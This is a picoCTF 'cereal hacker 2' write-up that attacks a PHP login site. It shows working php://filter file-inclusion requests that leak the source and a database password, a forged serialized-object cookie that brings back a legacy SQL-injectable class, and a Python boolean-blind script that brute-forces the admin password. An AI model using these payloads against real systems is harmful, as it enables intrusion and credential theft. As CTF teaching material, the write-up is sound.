# cereal hacker 2
Web Exploitation, 500 points

## Description:
> Get the admin's password.


## Solution: 

This is the follow-up for [cereal hacker 1](cereal_hacker_1.md).

Again, we visit a similar website and receive the same login page:
```console
root@kali:/media/sf_CTFs/pico/cereal_hacker_2# curl https://2019shell1.picoctf.com/problem/62195/ -L
<!DOCTYPE html>
<html>
<head>
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<link href="style.css" rel="stylesheet">
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</head>
        <body>
                <div class="container">
                        <div class="row">
                                <div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
                                        <div class="card card-signin my-5">
                                                <div class="card-body">
                                                        <h5 class="card-title text-center">Sign In</h5>
                                                            <form class="form-signin" action="index.php?file=login" method="post">
                                                                <div class="form-label-group">
                                                                        <input type="text" id="user" name="user" class="form-control" placeholder="Username" required autofocus>
                                                                        <label for="user">Username</label>
                                                                </div>

                                                                <div class="form-label-group">
                                                                        <input type="password" id="pass" name="pass" class="form-control" placeholder="Password" required>
                                                                        <label for="pass">Password</label>
                                                                </div>

                                                                <button class="btn btn-lg btn-primary btn-block text-uppercase" type="submit">Sign in</button>
                                                        </form>
                                                </div>
                                        </div>
                                </div>
                        </div>
                </div>

        </body>
</html>
```

The SQL injection from last time doesn't work anymore... But path traversal does!

```console
root@kali:/media/sf_CTFs/pico/cereal_hacker_2# curl https://2019shell1.picoctf.com/problem/62195/index.php?file=test
<!DOCTYPE html>
<html>
<head>
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<link href="style.css" rel="stylesheet">
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</head>Unable to locate test.php</html>
root@kali:/media/sf_CTFs/pico/cereal_hacker_2# curl https://2019shell1.picoctf.com/problem/62195/index.php?file=php://filter/read=convert.base64-encode/resource=admin
<!DOCTYPE html>
<html>
<head>
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<link href="style.css" rel="stylesheet">
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</head>PD9waHAKCnJlcXVpcmVfb25jZSgnY29va2llLnBocCcpOwoKaWYoaXNzZXQoJHBlcm0pICYmICRwZXJtLT5pc19hZG1pbigpKXsKPz4KCQoJPGJvZHk+CgkJPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KCQkJPGRpdiBjbGFzcz0icm93Ij4KCQkJCTxkaXYgY2xhc3M9ImNvbC1zbS05IGNvbC1tZC03IGNvbC1sZy01IG14LWF1dG8iPgoJCQkJCTxkaXYgY2xhc3M9ImNhcmQgY2FyZC1zaWduaW4gbXktNSI+CgkJCQkJCTxkaXYgY2xhc3M9ImNhcmQtYm9keSI+CgkJCQkJCQk8aDUgY2xhc3M9ImNhcmQtdGl0bGUgdGV4dC1jZW50ZXIiPldlbGNvbWUgdG8gdGhlIGFkbWluIHBhZ2UhPC9oNT4KCQkJCQkJCTxoNSBzdHlsZT0iY29sb3I6Ymx1ZSIgY2xhc3M9InRleHQtY2VudGVyIj5GbGFnOiBGaW5kIHRoZSBhZG1pbidzIHBhc3N3b3JkITwvaDU+CgkJCQkJCTwvZGl2PgoJCQkJCTwvZGl2PgoJCQkJPC9kaXY+CgkJCTwvZGl2PgoJCTwvZGl2PgoKCTwvYm9keT4KCjw/cGhwCn0KZWxzZXsKPz4KCQoJPGJvZHk+CgkJPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KCQkJPGRpdiBjbGFzcz0icm93Ij4KCQkJCTxkaXYgY2xhc3M9ImNvbC1zbS05IGNvbC1tZC03IGNvbC1sZy01IG14LWF1dG8iPgoJCQkJCTxkaXYgY2xhc3M9ImNhcmQgY2FyZC1zaWduaW4gbXktNSI+CgkJCQkJCTxkaXYgY2xhc3M9ImNhcmQtYm9keSI+CgkJCQkJCQk8aDUgY2xhc3M9ImNhcmQtdGl0bGUgdGV4dC1jZW50ZXIiPllvdSBhcmUgbm90IGFkbWluITwvaDU+CgkJCQkJCQk8Zm9ybSBhY3Rpb249ImluZGV4LnBocCIgbWV0aG9kPSJnZXQiPgoJCQkJCQkJCTxidXR0b24gY2xhc3M9ImJ0biBidG4tbGcgYnRuLXByaW1hcnkgYnRuLWJsb2NrIHRleHQtdXBwZXJjYXNlIiBuYW1lPSJmaWxlIiB2YWx1ZT0ibG9naW4iIHR5cGU9InN1Ym1pdCIgb25jbGljaz0iZG9jdW1lbnQuY29va2llPSd1c2VyX2luZm89OyBleHBpcmVzPVRodSwgMDEgSmFuIDE5NzAgMDA6MDA6MTggR01UOyBkb21haW49OyBwYXRoPS87JyI+R28gYmFjayB0byBsb2dpbjwvYnV0dG9uPgoJCQkJCQkJPC9mb3JtPgoJCQkJCQk8L2Rpdj4KCQkJCQk8L2Rpdj4KCQkJCTwvZGl2PgoJCQk8L2Rpdj4KCQk8L2Rpdj4KCgk8L2JvZHk+Cgo8P3BocAp9Cj8+Cg==</html>
```

Using `php://filter/read=convert.base64-encode/resource` in order to base64-encode files, we are able to extract the website logic:

#### admin.php

```php
<?php

require_once('cookie.php');

if(isset($perm) && $perm->is_admin()){
?>
	
	<body>
		<div class="container">
			<div class="row">
				<div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
					<div class="card card-signin my-5">
						<div class="card-body">
							<h5 class="card-title text-center">Welcome to the admin page!</h5>
							<h5 style="color:blue" class="text-center">Flag: Find the admin's password!</h5>
						</div>
					</div>
				</div>
			</div>
		</div>

	</body>

<?php
}
else{
?>
	
	<body>
		<div class="container">
			<div class="row">
				<div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
					<div class="card card-signin my-5">
						<div class="card-body">
							<h5 class="card-title text-center">You are not admin!</h5>
							<form action="index.php" method="get">
								<button class="btn btn-lg btn-primary btn-block text-uppercase" name="file" value="login" type="submit" onclick="document.cookie='user_info=; expires=Thu, 01 Jan 1970 00:00:18 GMT; domain=; path=/;'">Go back to login</button>
							</form>
						</div>
					</div>
				</div>
			</div>
		</div>

	</body>

<?php
}
?>
```

#### cookie.php

```php
<?php

require_once('../sql_connect.php');

// I got tired of my php sessions expiring, so I just put all my useful information in a serialized cookie
class permissions
{
	public $username;
	public $password;
	
	function __construct($u, $p){
		$this->username = $u;
		$this->password = $p;
	}

	function is_admin(){
		global $sql_conn;
		if($sql_conn->connect_errno){
			die('Could not connect');
		}
		//$q = 'SELECT admin FROM pico_ch2.users WHERE username = \''.$this->username.'\' AND (password = \''.$this->password.'\');';
		
		if (!($prepared = $sql_conn->prepare("SELECT admin FROM pico_ch2.users WHERE username = ? AND password = ?;"))) {
		    die("SQL error");
		}

		$prepared->bind_param('ss', $this->username, $this->password);
	
		if (!$prepared->execute()) {
		    die("SQL error");
		}
		
		if (!($result = $prepared->get_result())) {
		    die("SQL error");
		}

		$r = $result->fetch_all();
		if($result->num_rows !== 1){
			$is_admin_val = 0;
		}
		else{
			$is_admin_val = (int)$r[0][0];
		}
		
		$sql_conn->close();
		return $is_admin_val;
	}
}

/* legacy login */
class siteuser
{
	public $username;
	public $password;
	
	function __construct($u, $p){
		$this->username = $u;
		$this->password = $p;
	}

	function is_admin(){
		global $sql_conn;
		if($sql_conn->connect_errno){
			die('Could not connect');
		}
		$q = 'SELECT admin FROM pico_ch2.users WHERE admin = 1 AND username = \''.$this->username.'\' AND (password = \''.$this->password.'\');';
		
		$result = $sql_conn->query($q);
		if($result->num_rows != 1){
			$is_user_val = 0;
		}
		else{
			$is_user_val = 1;
		}
		
		$sql_conn->close();
		return $is_user_val;
	}
}


if(isset($_COOKIE['user_info'])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE['user_info'])));
	}
	catch(Exception $except){
		die('Deserialization error.');
	}
}

?>
```

==== sql_connect.php

```php
<?php


$sql_server = 'localhost';
$sql_user = 'mysql';
$sql_pass = 'this1sAR@nd0mP@s5w0rD#%';
$sql_conn = new mysqli($sql_server, $sql_user, $sql_pass);
$sql_conn_login = new mysqli($sql_server, $sql_user, $sql_pass);


?> 
```

#### regular_user.php

```php
<?php
require_once('cookie.php');

if(isset($perm)){
?>
	
<body>
	<div class="container">
		<div class="row">
			<div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
				<div class="card card-signin my-5">
					<div class="card-body">
						<h5 class="card-title text-center">Welcome to the regular user page!</h5>
						<form action="index.php" method="get">
							<button class="btn btn-lg btn-primary btn-block text-uppercase" name="file" value="login" type="submit" onclick="document.cookie='user_info=; expires=Thu, 01 Jan 1970 00:00:18 GMT; domain=; path=/;'">Go back to login</button>
						</form>
					</div>
				</div>
			</div>
		</div>
	</div>

</body>


<?php
}
else{
?>
	
<body>
	<div class="container">
		<div class="row">
			<div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
				<div class="card card-signin my-5">
					<div class="card-body">
						<h5 class="card-title text-center">You are not logged in!</h5>
						<form action="index.php" method="get">
							<button class="btn btn-lg btn-primary btn-block text-uppercase" name="file" value="login" type="submit" onclick="document.cookie='user_info=; expires=Thu, 01 Jan 1970 00:00:18 GMT; domain=; path=/;'">Go back to login</button>
						</form>
					</div>
				</div>
			</div>
		</div>
	</div>

</body>


<?php
}
?>
```

#### index.php

```php
<?php

if(isset($_GET['file'])){
	$file = $_GET['file'];
}
else{
	header('location: index.php?file=login');
	die();
}

if(realpath($file)){
	die();
}
else{
	include('head.php');
	if(!include($file.'.php')){
		echo 'Unable to locate '.$file.'.php';
	}
	include('foot.php');
}

?>
```

#### head.php

```php
<!DOCTYPE html>
<html>
<head>
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<link href="style.css" rel="stylesheet">
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</head>
```

#### foot.php

```php
</html>
```

We can see that the flag isn't hardcoded into the files themselves. We can also see why SQL injection isn't working anymore - the website moved to prepared statements which are considered much safer. However, there is one line that catches attention:

```php
$perm = unserialize(base64_decode(urldecode($_COOKIE['user_info'])));
```

The website is calling `unserialize` on unsanitized user input. That's a big no-no:

> Do not pass untrusted user input to unserialize() regardless of the options value of allowed_classes. Unserialization can result in code being loaded and executed due to object instantiation and autoloading, and a malicious user may be able to exploit this. ([Source](https://www.php.net/manual/en/function.unserialize.php))

We can probably reach code execution using this vulnerability, but in this case we have a much easier path. The author did not erase the old, vulnerable, permissions class:
```php
/* legacy login */
class siteuser
{
    // ...
    function is_admin(){
        //...
        $q = 'SELECT admin FROM pico_ch2.users WHERE admin = 1 AND username = \''.$this->username.'\' AND (password = \''.$this->password.'\');';
        //...
    }
    //...
}
```

It matches the same "interface" used by the newer `permissions`, and is still vulnerable to SQL injection. Therefore, we can reuse it by sending:

```
O:8:"siteuser":2:{s:8:"username";s:5:"admin";s:8:"password";s:24:"aaa' or password like '%";}
```

Instead of unserializing a `permissions` object, the PHP engine will unserialize a `siteuser` object and our injection will return from the dead.

Let's try it:

```console
root@kali:/media/sf_CTFs/pico/cereal_hacker_2# curl http://2019shell1.picoctf.com:62195/index.php?file=admin -H "Cookie: user_info=Tzo4OiJzaXRldXNlciI6Mjp7czo4OiJ1c2VybmFtZSI7czo1OiJhZG1pbiI7czo4OiJwYXNzd29y
ZCI7czoyNDoiYWFhJyBvciBwYXNzd29yZCBsaWtlICclIjt9" && echo
<!DOCTYPE html>
<html>
<head>
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<link href="style.css" rel="stylesheet">
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</head>
        <body>
                <div class="container">
                        <div class="row">
                                <div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
                                        <div class="card card-signin my-5">
                                                <div class="card-body">
                                                        <h5 class="card-title text-center">Welcome to the admin page!</h5>
                                                        <h5 style="color:blue" class="text-center">Flag: Find the admin's password!</h5>
                                                </div>
                                        </div>
                                </div>
                        </div>
                </div>

        </body>

</html>
```

We're in, but we didn't get the flag - the flag is the admin's password. We'll have to brute-force the password using a boolean-blind strategy:

In order to get the first character of the password, we try the following set of queries:
```
' or password like BINARY 'a%
' or password like BINARY 'b%
...
' or password like BINARY 'z%
' or password like BINARY '0%
...
' or password like BINARY '9%
...
```

Once we log in successfully, we know that the condition was met and that the first character of the password is the current character which allowed us to login. We then continue to the next character and so on.

```python
import requests
import string
import base64
import time

def send_req(password):
    time.sleep(0.2)
    payload = 'O:8:"siteuser":2:{{s:8:"username";s:5:"admin";s:8:"password";s:{}:"{}";}}'.format(len(password), password)
    cookies = dict(user_info=base64.b64encode(payload))
    r = requests.get("http://2019shell1.picoctf.com:62195/index.php?file=admin", cookies=cookies)
    if "Welcome" in r.text:
        return True
    else:
        return False

#alpha = set(string.printable) - set("'%_") # Pessimistic 
alpha = string.digits + string.ascii_letters + '{}' # Optimistic 

flag = ""
while True:
    for c in alpha:
        if send_req("' or password like BINARY '" + flag + c + "%"):
            flag += c
            print flag
            break
    else:
        break
```

Eventually, we get the flag: `picoCTF{c9f6ad462c6bb64a53c6e7a6452a6eb7}`.